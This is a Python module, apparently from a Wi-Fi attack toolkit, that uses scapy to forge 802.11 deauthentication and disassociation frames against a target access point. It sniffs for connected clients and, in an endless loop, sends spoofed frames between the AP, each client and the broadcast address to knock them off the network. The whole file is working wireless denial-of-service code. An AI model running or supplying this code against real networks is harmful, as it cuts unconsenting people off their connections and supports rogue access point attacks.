# TODO: re work the module description
"""
Extension that sends 3 DEAUTH/DISAS Frames:
 1 from the AP to the client
 1 from the client to the AP
 1 to the broadcast address
"""

import time
import logging
import scapy.all as scapy

LOGGER = logging.getLogger(__name__)


def craft_deauth_packet(sender, receiver, bssid):
    """
    Return a deauthentication packet crafted with given information

    :param sender: The MAC address of the sender
    :param receiver: The MAC address of the receiver
    :param bssid: The MAC address of the AccessPoint
    :type sender: str
    :type receiver: str
    :type bssid: str
    :return: A deauthentication packet
    :rtype: scapy.layers.dot11.RadioTap
    """
    return (scapy.RadioTap() / scapy.Dot11(
        type=0, subtype=12, addr1=receiver, addr2=sender, addr3=bssid) / scapy.Dot11Deauth())


def craft_disas_packet(sender, receiver, bssid):
    """
    Return a disassociation packet crafted with given information

    :param sender: The MAC address of the sender
    :param receiver: The MAC address of the receiver
    :param bssid: The MAC address of the AccessPoint
    :type sender: str
    :type receiver: str
    :type bssid: str
    :return: A disassociation packet
    :rtype: scapy.layers.dot11.RadioTap
    """
    return (scapy.RadioTap() / scapy.Dot11(
        type=0, subtype=10, addr1=receiver, addr2=sender, addr3=bssid) / scapy.Dot11Disas())


def craft_broadcast_packets(access_point):
    """
    Craft the broadcast packets for the access point

    :param access_point: MAC address of the AP
    :type access_point: str
    :return: A list of packets
    :rtype: list
    """
    broadcast = "ff:ff:ff:ff:ff:ff"
    return [
        craft_deauth_packet(access_point, broadcast, access_point),
        craft_disas_packet(access_point, broadcast, access_point)
    ]


def craft_packets(client, access_point):
    """
    Craft the following packets:
        1. Deauthentication from AP to client
        2. Deauthentication from client to AP
        3. Disassosiation from AP to client
        4. Disassosiation from client to AP

    :param client: BSSID of client
    :param access_point: BSSID of target access point
    :type client: str
    :type access_point: str
    :return: A list of deauthentication and disassosiation packets
    :rtype: list
    """
    return [
        craft_deauth_packet(access_point, client, access_point),
        craft_deauth_packet(client, access_point, access_point),
        craft_disas_packet(access_point, client, access_point),
        craft_disas_packet(client, access_point, access_point)
    ]


def find_client(mac_address, l2socket):
    """
    Try to find a client using the bssid given.

    :param mac_address: The bssid of the target access point
    :param l2socket: A socket to listen to packets
    :type mac_address: str
    :type l2socket: L2ListenSocket
    :return: A client if found or None otherwise
    :rtype: str or None
    :Example:

        >>> import scapy.all as scapy
        >>> interface = "wlan0"
        >>> bssid = "00:11:22:33:44:55"
        >>> socket = scapy.L2ListenSocket(iface=interface)
        >>> find_client(bssid, socket)
        "12:34:56:78:90:AB"
        >>> find_client(bssid, socket)
        None
    """
    packet = l2socket.sniff(count=1)[0]
    return (is_packet_relevant(packet, mac_address) and packet.addr3 == mac_address and
            ((packet.addr2 == mac_address and packet.addr1) or packet.addr2) or None)


def is_packet_relevant(packet, mac_address):
    """
    Check if the provided packet is valid based on:
        1. packet has type data
        2. packet is to or from mac_address

    :param packet: A packet to check against
    :param mac_address: A MAC address to test against
    :type packet: scapy.layers.dot11.RadioTap
    :type: mac_address: str
    :return: True if packet passes requirements and False otherwise
    :rtype: bool
    :Example:

        >>> import scapy.all as scapy
        >>> mac_address = "11:22:33:44:55:66:77"
        >>> packet = scapy.sniff(iface="wlan0", count=1)[0]
        >>> is_packet_relevant(packet, mac_address)
        True
    """
    return packet.type == 2 and packet.addr3 == mac_address


def deauth_clients(interface, mac_address):
    """
    Deauthenticate any client related to mac_address

    :param interface: Name of an interface
    :param mac_address: MAC address of the target AP
    :type interface: str
    :type mac_address: str
    :return: None
    :rtype: None
    .. note::
        This function run infinitely and therefore should only be run
        in a separate process where it can be stopped.
    """
    clients = set()
    packets = list()
    socket = scapy.L2Socket(iface=interface)

    packets += craft_broadcast_packets(mac_address)

    while True:
        new_client = find_client(mac_address, socket)
        if new_client and new_client not in clients:
            LOGGER.info("Found new client: {}".format(new_client))
            LOGGER.info("Deauthenticating new client: {}".format(new_client))
            print("Found new client: {}".format(new_client))
            print("Deauthenticating new client: {}".format(new_client))

            clients.add(new_client)
            packets += craft_packets(new_client, mac_address)

        time.sleep(0.2)
        map(socket.send, packets)
